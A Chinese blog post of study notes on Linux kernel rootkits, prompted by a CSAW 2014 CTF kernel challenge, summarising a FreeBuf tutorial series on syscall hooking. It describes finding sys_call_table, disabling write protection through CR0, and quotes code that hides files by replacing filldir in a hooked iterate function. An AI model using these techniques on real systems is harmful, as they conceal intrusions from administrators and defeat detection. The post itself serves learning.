---
title: Linux Kernel Rootkit Learning
date: 2017-08-25 12:27:29
tags:
- rootkit
- hooing system
categories:
- kernel_exploit
---

昨天做csaw 2014 ctf的kernel exploit，突然发现代码有点看不懂，但好像又似曾相识的感觉~后来想起来是在freebuf上看了linux rootkit的教程，但是那时看的不是很懂...，现在看，有种豁然开朗的感觉，所以就干脆学习一番。
<!-- more -->
## linux rootkit系列教程：
[Linux Rootkit系列一：LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)
[Linux Rootkit 系列二：基于修改 sys_call_table 的系统调用挂钩](http://www.freebuf.com/sectool/105713.html)
[Linux Rootkit系列三：实例详解 Rootkit 必备的基本功能](http://www.freebuf.com/articles/system/107829.html)
[Linux Rootkit 系列四：对于系统调用挂钩方法的补充](http://www.freebuf.com/articles/system/108392.html)
[Linux Rootkit 系列五：感染系统关键内核模块实现持久化](http://www.freebuf.com/articles/system/109034.html)

## Hooking Syscall
因为hooking sys_call_table中的系统调用在rootkit中扮演者很重要的角色，所以我们首先要做的就是学会hooking a syscall。其中最重要的就是finding the address of sys_call_table。教程中讲了好几种方法获得sys_call_table的地址：
1. force searching
2. reading System.map
3. with IDT
原理都比较简单，一看就懂，也不需要特别强调什么的。
然后需要解决的是写保护——因为sys_call_table所在的内存是有写保护的。这部分也不难，可以调用内核提供的操作寄存机CR0的接口。
在修改sys_call_table中的函数指针时要注意，我们必须要先保存原来的函数地址，因为在hooking的时候以及后面恢复系统调用时会用到。

## Hidding what you want 
其实我着重看的是教程中的系列三，很有趣，也很有用。但是跟教程里说的一样，我把重点中的重点放在了hidding file上，学会hidding file了，其他的基本也就会了。
文件的ls是通过系统调用getdents实现的，我们来看看getdents实现的[源码](http://elixir.free-electrons.com/linux/v3.13/source/fs/readdir.c#L192)：
```c
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char			d_name[1];
};

SYSCALL_DEFINE3(getdents, unsigned int, fd,
		struct linux_dirent __user *, dirent, unsigned int, count)
{
	struct fd f;
	struct linux_dirent __user * lastdirent;
	struct getdents_callback buf = {
		.ctx.actor = filldir,
		.count = count,
		.current_dir = dirent
	};
	int error;

	if (!access_ok(VERIFY_WRITE, dirent, count))
		return -EFAULT;

	f = fdget(fd);
	if (!f.file)
		return -EBADF;

	error = iterate_dir(f.file, &buf.ctx);
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		if (put_user(buf.ctx.pos, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fdput(f);
	return error;
}
```
可以看到sys_getdents主要调用了iterate_dir，我们再来看iterate_dir:
```c
struct dir_context {
	const filldir_t actor;
	loff_t pos;
};

int iterate_dir(struct file *file, struct dir_context *ctx)
{
	struct inode *inode = file_inode(file);
	int res = -ENOTDIR;
	if (!file->f_op->iterate)
		goto out;

	res = security_file_permission(file, MAY_READ);
	if (res)
		goto out;

	res = mutex_lock_killable(&inode->i_mutex);
	if (res)
		goto out;

	res = -ENOENT;
	if (!IS_DEADDIR(inode)) {
		ctx->pos = file->f_pos;
		res = file->f_op->iterate(file, ctx);
		file->f_pos = ctx->pos;
		file_accessed(file);
	}
	mutex_unlock(&inode->i_mutex);
out:
	return res;
}
EXPORT_SYMBOL(iterate_dir);
```
这部分操作主要是调用file_operations里面的iterate函数，然后我们再来查找[vfs](http://elixir.free-electrons.com/linux/v3.13/source/fs/ext4/dir.c#L505)的file_operations的定义：
```c
const struct file_operations ext4_dir_operations = {
	.llseek		= ext4_dir_llseek,
	.read		= generic_read_dir,
	.iterate	= ext4_readdir,
	.unlocked_ioctl = ext4_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl	= ext4_compat_ioctl,
#endif
	.fsync		= ext4_sync_file,
	.release	= ext4_release_dir,
};
```
可以看到，iterate的实现是ext4_readdir，再次跟进去貌似有点难读了，难怪作者也是跟到这没怎么详细讲了~只是粗略地讲了下过程：ext4_readdir最终会通过filldir把目录里面的项目一个一个的填到getdents返回的缓冲区里，缓冲区里是一个个的linux_dirent。
总的来说，调用层次如下：
sys_getdents-> iterate_dir-> struct file_operations 里的iterate->省略若干层次 -> struct dir_context 里的actor(mostly filldir)。
要达到隐藏文件的目的，我们需要hooking filldir，在hooking function中去掉我们需要隐藏的文件记录，不填到缓冲区，这样应用程序就收不到相应的记录，也就打到了隐藏文件的目的。

具体思路是hooking相应目录的iterate，把dir_context的actor改为fake filldir，fake filldir把隐藏的文件过滤。下面是作者的实现：
```c
int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    // 备份真的 ``filldir``，以备后面之需。
    real_filldir = ctx->actor;

    // 把 ``struct dir_context`` 里的 ``actor``，
    // 也就是真的 ``filldir``
    // 替换成我们的假 ``filldir``
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
        // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
        fm_alert("Hiding: %s", name);
        return 0;
    }

    /* pr_cont("%s ", name); */

    // 如果不是需要隐藏的文件，
    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
```
看这类文章真的能学到好多，作者写的也真心不错。其他的也粗略地看了下，思路都差不多。还有那个系列五也非常有趣，下次碰到相应的问题再来详细研究。
有趣，接下来去做2014 csaw ctf的kernel exploit了。
